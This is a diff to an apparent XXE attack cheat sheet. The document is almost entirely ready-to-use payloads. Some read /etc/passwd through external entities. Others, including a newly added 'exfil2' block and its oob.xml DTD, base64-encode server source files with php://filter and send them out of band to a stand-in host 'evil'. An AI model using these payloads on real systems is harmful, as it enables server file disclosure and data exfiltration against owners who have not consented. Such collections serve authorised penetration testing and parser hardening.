@@ -38,7 +38,7 @@ http://www.xmlvalidation.com/index.php
 # test
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "blah" > ]><tag>&xxe;</tag>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><tag>&xxe;</tag>
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/blah" > ]><tag>&xxe;</tag>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil/blah" > ]><tag>&xxe;</tag>
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://../"> %xxe;]>
 
 # XXE inside a SOAP node (https://twitter.com/Agarri_FR/status/656440244116574208)
@@ -66,8 +66,24 @@ can upload any format not just zip
 # exfil
 payload:
 <!DOCTYPE meh [<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"><!ENTITY % dtd SYSTEM "http://evil/send.dtd">%dtd;%send;]]>
+
 send.dtd:
 <!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">%all;
+
+# exfil2
+payload:
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "http://evil/oob.xml">
+%sp;
+%param1;
+]>
+<r>&exfil;</r>
+
+oob.xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil/?%data;'>">
 
 # synacktiv drupal services
 <!DOCTYPE doc [
